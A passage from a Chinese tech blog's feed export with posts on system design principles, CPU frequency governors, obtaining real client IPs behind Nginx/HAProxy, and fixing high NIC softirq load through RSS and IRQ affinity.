<li>微服务架构的理论基础 - 康威定律 <a href="https://yq.aliyun.com/articles/8611" target="_blank" rel="external">https://yq.aliyun.com/articles/8611</a></li>
<li>每个架构师都应该研究下康威定律 <a href="http://36kr.com/p/5042735.html" target="_blank" rel="external">http://36kr.com/p/5042735.html</a></li>
</ul>
<blockquote>
<p>二八定律</p>
</blockquote>
<ul>
<li>80%的结果取决于20%的原因</li>
</ul>
<h4 id="系统设计遵循的原则"><a href="#系统设计遵循的原则" class="headerlink" title="系统设计遵循的原则"></a>系统设计遵循的原则</h4><h5 id="1-高并发原则"><a href="#1-高并发原则" class="headerlink" title="1. 高并发原则"></a>1. 高并发原则</h5><blockquote>
<p>无状态</p>
</blockquote>
<ul>
<li>无状态应用，便于水平扩展</li>
<li>有状态配置可通过配置中心实现无状态</li>
<li>实践: Disconf、Yaconf、Zookpeer、Consul、Confd、Diamond、Xdiamond等</li>
</ul>
<blockquote>
<p>拆分</p>
</blockquote>
<ul>
<li>系统维度：按照系统功能、业务拆分，如购物车，结算，订单等</li>
<li>功能维度：对系统功能在做细粒度拆分</li>
<li>读写维度：根据读写比例特征拆分；读多，可考虑多级缓存；写多，可考虑分库分表</li>
<li>AOP维度： 根据访问特征，按照AOP进行拆分，比如商品详情页可分为CDN、页面渲染系统，CDN就是一个AOP系统</li>
<li>模块维度：对整体代码结构划分Web、Service、DAO</li>
</ul>
<blockquote>
<p>服务化</p>
</blockquote>
<ul>
<li>服务化演进: 进程内服务-单机远程服务-集群手动注册服务-自动注册和发现服务-服务的分组、隔离、路由-服务治理</li>
<li>考虑服务分组、隔离、限流、黑白名单、超时、重试机制、路由、故障补偿等</li>
<li>实践：利用Nginx、HaProxy、LVS等实现负载均衡，ZooKeeper、Consul等实现自动注册和发现服</li>
</ul>
<blockquote>
<p>消息队列</p>
</blockquote>
<ul>
<li>目的: 服务解耦(一对多消费)、异步处理、流量削峰缓冲等</li>
<li>大流量缓冲： 牺牲强一致性，保证最终一致性(案例：库存扣减，现在Redis中做扣减，记录扣减日志，通过后台进程将扣减日志应用到DB)</li>
<li>数据校对: 解决异步消息机制下消息丢失问题</li>
</ul>
<blockquote>
<p>数据异构</p>
</blockquote>
<ul>
<li>数据异构: 通过消息队列机制接收数据变更，原子化存储</li>
<li>数据闭环: 屏蔽多从数据来源，将数据异构存储，形成闭环</li>
</ul>
<blockquote>
<p>缓存银弹</p>
</blockquote>
<ul>
<li><p>用户层:</p>
<pre><code>*   DNS缓存
</code></pre><ul>
<li>浏览器DNS缓存</li>
<li>操作系统DNS缓存</li>
<li>本地DNS服务商缓存</li>
<li>DNS服务器缓存</li>
<li>客户端缓存</li>
<li>浏览器缓存(Expires、Cache-Control、Last-Modified、Etag)*   App客户缓存(js/css/image…)</li>
</ul>
</li>
<li><p>代理层：</p>
<pre><code>*   CDN缓存(一般基于ATS、Varnish、Nginx、Squid等构建,边缘节点-二级节点-中心节点-源站)
</code></pre></li>
<li><p>接入层：</p>
<pre><code>*   Nginx为例：

    *   Proxy_cache： 代理缓存,可以存储到/dev/shm或者SSD
*   FastCGI Cache
*   Nginx+Lua+Redis: 业务数据缓存
</code></pre><ul>
<li><p>PHP为例：</p>
<pre><code>*   Opcache： 缓存PHP的Opcodes
</code></pre></li>
</ul>
</li>
<li><p>应用层：</p>
<pre><code>*   页面静态化
</code></pre><ul>
<li>业务数据缓存(Redis/Memcached/本地文件等)</li>
<li>消息队列</li>
</ul>
</li>
<li><p>数据层：</p>
<pre><code>*   NoSQL： Redis、Memcache、SSDB等
</code></pre><ul>
<li>MySQL： Innodb/MyISAM等Query Cache、Key Cache、Innodb Buffer Size等</li>
</ul>
</li>
<li><p>系统层：</p>
<pre><code>*   CPU : L1/L2/L3 Cache/NUMA
</code></pre><ul>
<li>内存</li>
<li>磁盘：磁盘本身缓存、dirty_ratio/dirty_background_ratio、阵列卡本身缓存</li>
</ul>
</li>
</ul>
<blockquote>
<p>并发化</p>
</blockquote>
<h5 id="2-高可用原则"><a href="#2-高可用原则" class="headerlink" title="2. 高可用原则"></a>2. 高可用原则</h5><blockquote>
<p>降级</p>
</blockquote>
<ul>
<li>降级开关集中化管理：将开关配置信息推送到各个应用</li>
<li>可降级的多级读服务：如服务调用降级为只读本地缓存</li>
<li>开关前置化：如Nginx+lua(OpenResty)配置降级策略，引流流量；可基于此做灰度策略</li>
<li>业务降级：高并发下，保证核心功能，次要功能可由同步改为异步策略或屏蔽功能</li>
</ul>
<blockquote>
<p>限流</p>
</blockquote>
<ul>
<li>目的: 防止恶意请求攻击或超出系统峰值</li>
<li><p>实践：</p>
<pre><code>*   恶意请求流量只访问到Cache
</code></pre><ul>
<li>穿透后端应用的流量使用Nginx的limit处理</li>
<li>恶意IP使用Nginx Deny策略或者iptables拒绝</li>
</ul>
</li>
</ul>
<blockquote>
<p>切流量</p>
</blockquote>
<ul>
<li>目的：屏蔽故障机器</li>
<li><p>实践:</p>
<pre><code>*   DNS: 更改域名解析入口，如DNSPOD可以添加备用IP，正常IP故障时，会自主切换到备用地址;生效实践较慢
</code></pre><ul>
<li>HttpDNS: 为了绕过运营商LocalDNS实现的精准流量调度</li>
<li>LVS/HaProxy/Nginx: 摘除故障节点</li>
</ul>
</li>
</ul>
<blockquote>
<p>可回滚</p>
</blockquote>
<ul>
<li>发布版本失败时可随时快速回退到上一个稳定版本</li>
</ul>
<h5 id="3-业务设计原则"><a href="#3-业务设计原则" class="headerlink" title="3. 业务设计原则"></a>3. 业务设计原则</h5><ul>
<li>防重设计</li>
<li>幂等设计</li>
<li>流程定义</li>
<li>状态与状态机</li>
<li>后台系统操作可反馈</li>
<li>后台系统审批化</li>
<li>文档注释</li>
<li>备份</li>
</ul>
<h5 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h5><p>先行规划和设计时有必要的，要对现有问题有方案，对未来有预案;欠下的技术债，迟早都是要还的。</p>
]]></content>
      
        <categories>
            
            <category> 架构之路 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CPU工作模式及调频]]></title>
      <url>/2017/03/24/cpu-e5-b7-a5-e4-bd-9c-e6-a8-a1-e5-bc-8f-e5-8f-8a-e8-b0-83-e9-a2-91.html</url>
      <content type="html"><![CDATA[<h5 id="安装i7z及cpufrequtils"><a href="#安装i7z及cpufrequtils" class="headerlink" title="安装i7z及cpufrequtils"></a>安装i7z及cpufrequtils</h5><pre><code> apt-get install i7z cpufrequtils
`&lt;/pre&gt;

##### 常见的CPU工作模式

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
  &lt;th&gt;调速器&lt;/th&gt;
  &lt;th align=&quot;left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
  &lt;td&gt;ondemand&lt;/td&gt;
  &lt;td align=&quot;left&quot;&gt;按需快速动态调整CPU频率， 一有cpu计算量的任务，就会立即达到最大频率运行，等执行完毕就立即回到最低频率（阙值为 95%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;performance&lt;/td&gt;
  &lt;td align=&quot;left&quot;&gt;运行于最大频率&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;conservative&lt;/td&gt;
  &lt;td align=&quot;left&quot;&gt;按需快速动态调整CPU频率， 一有cpu计算量的任务，就会立即达到最大频率运行，等执行完毕就立即回到最低频率（阙值为 75%）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;powersave&lt;/td&gt;
  &lt;td align=&quot;left&quot;&gt;运行于最小频率&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;userspace&lt;/td&gt;
  &lt;td align=&quot;left&quot;&gt;运行于用户指定的频率&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

##### 查看当前CPU工作模式

&lt;pre&gt;`查看CPU当前的工作模式
cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor

查看支持的CPU工作模式
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors

`&lt;/pre&gt;

由于在Debian 8下默认使用intel_pstate驱动,只支持performance和powersave模式,不同频率驱动程序支持的模式不同
具体可以参考：CPU frequency scaling  http://t.cn/R6cQXvp

##### 调整最高性能模式

&lt;pre&gt;`echo &apos;performance&apos; |tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
`&lt;/pre&gt;

##### CPU调频

&lt;pre&gt;`Usage: cpufreq-set [options] Options:
-c CPU, --cpu CPU       #指定CPU核心号，请注意上图的analyzing CPU数字。
-d FREQ, --min FREQ     #手工指定最小主频速度。（在userspace策略）
-u FREQ, --max FREQ     #手工指定最大主频速度。（在userspace策略）
-g GOV, --governor GOV  #设置工作策略
-f FREQ, --freq FREQ    #设定特定的工作频率（CPU默认档次）
#请参考上图的available frequency steps
-h, --help            #输出这个帮助信息

cpufreq-set  -d 2.4Ghz -u 2.4Ghz
</code></pre><h5 id="实时查看频率"><a href="#实时查看频率" class="headerlink" title="实时查看频率"></a>实时查看频率</h5><p>通过i7z命令可实时查看当前CPU的工作频率</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx/Haproxy作为反向代理或负载均衡时如何获取客户真实IP？]]></title>
      <url>/2017/03/01/nginxhaproxy-e4-bd-9c-e4-b8-ba-e5-8f-8d-e5-90-91-e4-bb-a3-e7-90-86-e6-88-96-e8-b4-9f-e8-bd-bd-e5-9d-87-e8-a1-a1-e6-97-b6-e5-a6-82-e4-bd-95-e8-8e-b7-e5-8f-96-e5-ae-a2-e6-88-b7-e7-9c-9f-e5-ae-9eip.html</url>
      <content type="html"><![CDATA[<h5 id="Nginx代理配置"><a href="#Nginx代理配置" class="headerlink" title="Nginx代理配置"></a>Nginx代理配置</h5><p>增加如下配置:</p>
<pre><code>proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X_FORWARDED_PROTO https;
proxy_set_header Host $host;
`&lt;/pre&gt;

##### Haproxy配置

&lt;pre&gt;`option forwardfor

`&lt;/pre&gt;

##### 后端Nginx配置

&lt;pre&gt;`set_real_ip_from  1.1.1.1;  前端Nginx代理或者负载均衡的IP(在后端Nginx日志中显示的)
real_ip_header  X-Forwarded-For;
real_ip_recursive  on;
`&lt;/pre&gt;

##### 后端Nginx访问控制

&lt;pre&gt;`location ~ /test/api/ {

        set $allow false;
        if ($http_x_forwarded_for ~ &quot;2.2.2.2&quot;) {
            set $allow false;
                        }
        if ($allow = false) { return 403;}
            proxy_pass  http://web;
        }
}
</code></pre><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><blockquote>
<ul>
<li><a href="http://www.wkii.org/nginx-cdn-get-user-real-ip.html" target="_blank" rel="external">http://www.wkii.org/nginx-cdn-get-user-real-ip.html</a></li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[网卡软中断过高问题优化总结]]></title>
      <url>/2017/02/28/e7-bd-91-e5-8d-a1-e8-bd-af-e4-b8-ad-e6-96-ad-e8-bf-87-e9-ab-98-e9-97-ae-e9-a2-98-e4-bc-98-e5-8c-96-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><p>游戏网关高峰期时出网络丢包,CPU0软中断%sys高达90%</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="什么是中断"><a href="#什么是中断" class="headerlink" title="什么是中断?"></a>什么是中断?</h4><p>由于接收来自外围硬件(相对于CPU和内存)的异步信号或者来自软件的同步信号，而进行相应的硬件、软件处理；发出这样的信号称为进行中断请求(interrupt request, IRQ)</p>
<h4 id="硬中断与软中断"><a href="#硬中断与软中断" class="headerlink" title="硬中断与软中断?"></a>硬中断与软中断?</h4><ul>
<li><strong>硬中断</strong>：外围硬件发给CPU或者内存的异步信号就称之为硬中断</li>
<li><strong>软中断</strong>：由软件系统本身发给操作系统内核的中断信号，称之为软中断。通常是由硬中断处理程序或进程调度程序对操作系统内核的中断，也就是我们常说的系统调用(System Call)</li>
</ul>
<h4 id="硬中断与软中断之区别与联系？"><a href="#硬中断与软中断之区别与联系？" class="headerlink" title="硬中断与软中断之区别与联系？"></a>硬中断与软中断之区别与联系？</h4><ol>
<li>硬中断是有外设硬件发出的，需要有中断控制器之参与。其过程是外设侦测到变化，告知中断控制器，中断控制器通过CPU或内存的中断脚通知CPU，然后硬件进行程序计数器及堆栈寄存器之现场保存工作（引发上下文切换），并根据中断向量调用硬中断处理程序进行中断处理</li>
<li>软中断则通常是由硬中断处理程序或者进程调度程序等软件程序发出的中断信号，无需中断控制器之参与，直接以一个CPU指令之形式指示CPU进行程序计数器及堆栈寄存器之现场保存工作(亦会引发上下文切换)，并调用相应的软中断处理程序进行中断处理(即我们通常所言之系统调用)</li>
<li>硬中断直接以硬件的方式引发，处理速度快。软中断以软件指令之方式适合于对响应速度要求不是特别严格的场景</li>
<li>硬中断通过设置CPU的屏蔽位可进行屏蔽，软中断则由于是指令之方式给出，不能屏蔽</li>
<li>硬中断发生后，通常会在硬中断处理程序中调用一个软中断来进行后续工作的处理</li>
<li>硬中断和软中断均会引起上下文切换(进程/线程之切换)，进程切换的过程是差不多的</li>
</ol>
<h3 id="查看中断情况"><a href="#查看中断情况" class="headerlink" title="查看中断情况"></a>查看中断情况</h3><p><strong>查看中断分布情况即CPU都在哪些设备上干活，干了多少(也可以使用itop工具实时查看)？</strong></p>
<pre><code>root@geekwolf:~# cat /proc/interrupts

           CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      
  0:        620          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-edge      timer
  8:          1          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-edge      rtc0
  9:      20774          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   acpi
 16:         28          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   ehci_hcd:usb1
 23:        243          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-IO-APIC-fasteoi   ehci_hcd:usb2
 88:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  DMAR_MSI-edge      dmar0
 89:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  DMAR_MSI-edge      dmar1
 90:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 91:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 92:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 93:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 94:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 95:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 96:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 97:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 98:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
 99:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
100:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      PCIe PME
101:     169988          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      mpt2sas0-msix0
134:    1900138          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      eth2-q0
150:    4262209          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      eth3-q0
166:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
167:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
168:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
169:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
170:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
171:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
172:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
173:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
174:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
175:          4          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
176:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
177:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
178:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
179:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
180:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
181:          2          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0  IR-PCI-MSI-edge      ioat-msix
NMI:        710        280        658        235        114         91         76         74        208        123        176        128        106         93        102         95         30        360        790         46         28         17         10          8         10        129       1166         22         18         16         11          7   Non-maskable interrupts
LOC:    4230314    2640664    2427443    1337890    1091372     892129     819153     816781    2695809    1563153    1368637    1608410    1241692    1166692    1205270    1124865     120831    1966946     328048     816162     163492     222276     129805     121126     111906     599782    1247371     194215     162828     145678     118762     114295   Local timer interrupts
SPU:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Spurious interrupts
PMI:        710        280        658        235        114         91         76         74        208        123        176        128        106         93        102         95         30        360        790         46         28         17         10          8         10        129       1166         22         18         16         11          7   Performance monitoring interrupts
IWI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   IRQ work interrupts
RES:     679921    1369165    1013002     573776     543083     540027     593345     588120     842115     846190     874862     890102     873810     860080     867322     848916       3879      63916      10863      12850       7463       6350      10889      16041       2065      13207       6870       6817       4030       4700       5190       7430   Rescheduling interrupts
CAL:      46507      67439      67569      67567      67565      67566      67566      67568     154689      67553      67511      67538      67568      67557      67534      67519      67520      26471      67470      67470      67476      67525      67518      67525      67545      64065      67210      67506      67485      67492      67526      67521   Function call interrupts
TLB:       6547       3416       1798       1015        361        637        271        447        822        113       1079        222        259        198        265        844        157       1470       3468        767        499        262        338        230         41       1457       4023        290        105         93         46        177   TLB shootdowns
TRM:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Thermal event interrupts
THR:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Threshold APIC interrupts
MCE:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0   Machine check exceptions
MCP:        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569        569   Machine check polls
ERR:          0
MIS:          0

`&lt;/pre&gt;

从上面的数据可以看出网卡eth2、eth3软中断都落在CPU0可以通过cat /proc/softirqs查看具体的软中断情况,总的中断次数可以通过vmstat或者dstat查看，其中vmstat中的in表示每秒的中断次数；
通过mpstat -P ALL 2,每隔两秒查看下所有核状态信息，其中%irq为硬中断，%soft为软中断

&lt;pre&gt;`root@geekwolf:~# mpstat -P ALL 2
08:42:04 AM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest   %idle
08:42:05 AM  all    4.31    0.00    0.70    0.00    0.00    0.06    0.00    0.00   94.93
08:42:05 AM    0    5.26    0.00    1.05    0.00    0.00    60.05    0.00    0.00   92.63
08:42:05 AM    1    7.07    0.00    1.01    0.00    0.00    0.00    0.00    0.00   91.92
08:42:05 AM    2    8.91    0.00    0.99    0.00    0.00    0.00    0.00    0.00   90.10
08:42:05 AM    3    8.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   91.00
08:42:05 AM    4    8.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   91.00
08:42:05 AM    5    7.00    0.00    2.00    0.00    0.00    0.00    0.00    0.00   91.00
08:42:05 AM    6    7.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   92.00
08:42:05 AM    7    4.12    0.00    1.03    0.00    0.00    0.00    0.00    0.00   94.85
08:42:05 AM    8    4.17    0.00    1.04    0.00    0.00    0.00    0.00    0.00   94.79
08:42:05 AM    9    8.91    0.00    0.99    0.00    0.00    0.00    0.00    0.00   90.10
08:42:05 AM   10    4.17    0.00    2.08    0.00    0.00    0.00    0.00    0.00   93.75
08:42:05 AM   11    6.12    0.00    1.02    0.00    0.00    0.00    0.00    0.00   92.86
08:42:05 AM   12    6.00    0.00    2.00    0.00    0.00    0.00    0.00    0.00   92.00
08:42:05 AM   13    3.16    0.00    1.05    0.00    0.00    0.00    0.00    0.00   95.79
08:42:05 AM   14    8.16    0.00    1.02    0.00    0.00    0.00    0.00    0.00   90.82
08:42:05 AM   15    6.06    0.00    1.01    0.00    0.00    1.01    0.00    0.00   91.92
08:42:05 AM   16    3.00    0.00    1.00    0.00    0.00    0.00    0.00    0.00   96.00
08:42:05 AM   17    2.02    0.00    1.01    0.00    0.00    0.00    0.00    0.00   96.97
08:42:05 AM   18    2.04    0.00    1.02    0.00    0.00    0.00    0.00    0.00   96.94
08:42:05 AM   19    2.97    0.00    0.99    0.00    0.00    0.00    0.00    0.00   96.04
08:42:05 AM   20    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96
08:42:05 AM   21    2.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.00
08:42:05 AM   22    3.03    0.00    0.00    0.00    0.00    0.00    0.00    0.00   96.97
08:42:05 AM   23    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96
08:42:05 AM   24    4.95    0.00    0.00    0.00    0.00    0.00    0.00    0.00   95.05
08:42:05 AM   25    2.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.98
08:42:05 AM   26    3.03    0.00    0.00    0.00    0.00    0.00    0.00    0.00   96.97
08:42:05 AM   27    2.04    0.00    0.00    0.00    0.00    0.00    0.00    0.00   97.96
08:42:05 AM   28    1.01    0.00    1.01    0.00    0.00    0.00    0.00    0.00   97.98
08:42:05 AM   29    1.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.98
08:42:05 AM   30    1.01    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.99
08:42:05 AM   31    1.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00   98.98

`&lt;/pre&gt;

### 何优化软中断CPU0过高问题

#### RSS(Receive Side Scaling，需网卡支持多队列)

##### 查看网卡是否支持队列

&lt;pre&gt;`root@geekwolf:~# lscpi -vvv
06:00.0 Ethernet controller: Broadcom Corporation BCM57840 NetXtreme II 10/20-Gigabit Ethernet (rev 11)
 Subsystem: Hewlett-Packard Company Device 22fa
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr+ Stepping- SERR+ FastB2B- DisINTx+
 Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &amp;gt;TAbort- &amp;lt;tabort - &amp;lt;MAbort- &amp;gt;SERR- &amp;lt;perr - INTx-
 Latency: 0, Cache Line Size: 64 bytes
 Interrupt: pin A routed to IRQ 32
 Region 0: Memory at 93800000 (64-bit, prefetchable) [size=8M]
 Region 2: Memory at 93000000 (64-bit, prefetchable) [size=8M]
 Region 4: Memory at 95000000 (64-bit, prefetchable) [size=64K]
 [virtual] Expansion ROM at 95080000 [disabled] [size=512K]
 Capabilities: [48] Power Management version 3
   Flags: PMEClk- DSI- D1- D2- AuxCurrent=0mA PME(D0+,D1-,D2-,D3hot+,D3cold+)
   Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=1 PME-
 Capabilities: [50] Vital Product Data
   Product Name: HP FlexFabric 10Gb 2-port 536FLB Adapter
   Read-only fields:
     [PN] Part number: 766488-001
     [EC] Engineering changes: A-5444
     [MN] Manufacture ID: 31 30 33 43
     [V0] Vendor specific: 12W PCIeGen3
     [V1] Vendor specific: 7.10.55
     [V3] Vendor specific: 7.10.72
     [V5] Vendor specific: 0A
     [V6] Vendor specific: 7.10.72
     [V7] Vendor specific: 536FLB
     [SN] Serial number: 7C444703LG
     [V2] Vendor specific: 5447
     [V4] Vendor specific: 8CDCD419D870
     [RV] Reserved: checksum good, 186 byte(s) reserved
   End
 Capabilities: [a0] MSI-X: Enable+ Count=32 Masked-
`&lt;/pre&gt;

找到Ethernet controller项，如果有MSI-X,Enable+ 并且Count&gt;1，表示该网卡支持多队列

##### 查看网卡支持多少个队列

&lt;pre&gt;`root@geekwolf:~# grep eth0 /proc/interrupts |awk &apos;{print $NF}&apos;
eth0
eth0-fp-0
eth0-fp-1
eth0-fp-2
eth0-fp-3
eth0-fp-4
eth0-fp-5
eth0-fp-6
eth0-fp-7
`&lt;/pre&gt;

##### 配置SMP IRQ affinity

(即绑定队列到不同CPU,Kernel&gt;2.4)

方法1：开启系统irqbalance服务

&lt;pre&gt;`apt-get -y install irqbalance
service irqbalance start
`&lt;/pre&gt;

方法2: 手动绑定

&lt;pre&gt;`/proc/irq/：该目录下存放的是以IRQ号命名的目录，如/proc/irq/40/，表示中断号为40的相关信息
/proc/irq/[irq_num]/smp_affinity：该文件存放的是CPU位掩码（十六进制）。修改该文件中的值可以改变CPU和某中断的亲和性
/proc/irq/[irq_num]/smp_affinity_list：该文件存放的是CPU列表（十进制）。注意，CPU核心个数用表示编号从0开始，如cpu0,cpu1等,

smp_affinity和smp_affinity_list修改其一即可，下面修改smp_affinity：

echo $bitmask &amp;gt; /proc/irq/IRQ#/smp_affinity
示例(把140号中断绑定到前4个CPU[cpu0-3]上面):
echo  f &amp;gt;/proc/irq/140/smp_affinity
